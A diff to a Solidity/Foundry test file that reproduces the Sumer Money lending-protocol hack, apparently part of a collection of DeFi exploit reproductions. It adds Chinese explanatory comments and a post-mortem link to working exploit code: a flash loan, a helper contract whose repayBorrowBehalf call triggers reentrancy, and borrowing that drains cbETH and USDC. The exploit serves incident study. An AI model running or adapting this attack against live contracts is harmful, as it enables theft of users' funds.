@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
-
+       
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
@@ -16,6 +16,7 @@ import "./../interface.sol";
 // @Analysis
 // Post-mortem :
 // Twitter Guy : https://twitter.com/0xNickLFranklin/status/1778986926705672698
+// Article: https://blog.verichains.io/p/sumer-money-hack-reentrancy-and-exchange
 // Hacking God :
 
 interface IClaimer {
@@ -55,10 +56,10 @@ contract SumerMoney is Test {
         tokens[0] = address(WETH);
         tokens[1] = address(USDC);
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 150 ether;
-        amounts[1] = 645_000 * 1e6;
+        amounts[0] = 150 ether; // 借150 ether
+        amounts[1] = 645_000 * 1e6; // 借645,000 USDC
         bytes memory userData = "";
-        Balancer.flashLoan(address(this), tokens, amounts, userData);
+        Balancer.flashLoan(address(this), tokens, amounts, userData); // 對Balancer Vault進行閃電貸
 
         emit log_named_decimal_uint("Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
         emit log_named_decimal_uint("Attacker cbETH Balance After exploit", cbETH.balanceOf(address(this)), 18);
@@ -77,11 +78,11 @@ contract SumerMoney is Test {
         // sdrETH.exchangeRate
         emit log_named_decimal_uint("Before re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);
 
-        sdrETH.mint{value: amounts[0]}();
+        sdrETH.mint{value: amounts[0]}(); // 存入ETH
 
-        helper = new Helper{value: 1}();
-        USDC.transfer(address(helper), amounts[1]); // 給Helper Mint sdrUSDC
-        helper.borrow(amounts[1]); // 借USDC
+        helper = new Helper{value: 1}(); // 部署Helper合約
+        USDC.transfer(address(helper), amounts[1]); // 給Helper存入USDC
+        helper.borrow(amounts[1]); // 借出ETH，並還款觸發reentrancy
 
         WETH.deposit{value: amounts[0]}(); // 把ETH換回WETH
         WETH.transfer(address(Balancer), amounts[0]); // 還給Balancer
@@ -95,14 +96,14 @@ contract SumerMoney is Test {
         // the exchange rate would be much higher than it should be
         emit log_named_decimal_uint("In re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);
 
-        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH))); // 借出cbETH
-        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6); // 借出USDC
-        // only needed approximately 74 sdrETH to redeem back his original amount of 150 ETH
-        sdrETH.redeemUnderlying(150 ether); // 贖回ETH
+        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH))); // 借出cbETH(profit)
+        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6); // 借出USDC(profit)
+        // 只需要約74 sdrETH來贖回他原來的150 ETH
+        sdrETH.redeemUnderlying(150 ether); // 贖回所有的ETH
         uint256[] memory tokenIds = new uint256[](2);
-        tokenIds[0] = 309;
-        tokenIds[1] = 310;
-        claimer.claim(tokenIds);
+        tokenIds[0] = 309; // sdrETH
+        tokenIds[1] = 310; // sdrUSDC
+        claimer.claim(tokenIds); // 領取sdrETH和sdrUSDC
     }
 
     receive() external payable {}
@@ -126,22 +127,22 @@ contract Helper {
         uint256 amount
     ) external {
         USDC.approve(address(sdrUSDC), amount);
-        sdrUSDC.mint(amount);
+        sdrUSDC.mint(amount); // 存入USDC
 
         uint256 borrowAmount = address(sdrETH).balance;
         sdrETH.borrow(borrowAmount); // 借出ETH
-        // 馬上還款
+        // 馬上還款，加1wei為了過received > borrows
         sdrETH.repayBorrowBehalf{value: borrowAmount + 1}(address(this)); // 觸發reentrancy
 
-        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this))); // 把USDC贖回來
+        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this))); // 把USDC提回來
         uint256[] memory tokenIds = new uint256[](1);
         tokenIds[0] = 311;
-        claimer.claim(tokenIds);
-        USDC.transfer(owner, USDC.balanceOf(address(this)));
+        claimer.claim(tokenIds); // 領取sdrUSDC
+        USDC.transfer(owner, USDC.balanceOf(address(this))); // 還給owner
     }
 
     receive() external payable {
-        // 觸發攻擊
+        // 觸發owner的攻擊
         if (msg.value == 1) {
             owner.call(abi.encodeWithSignature("attack()"));
         }
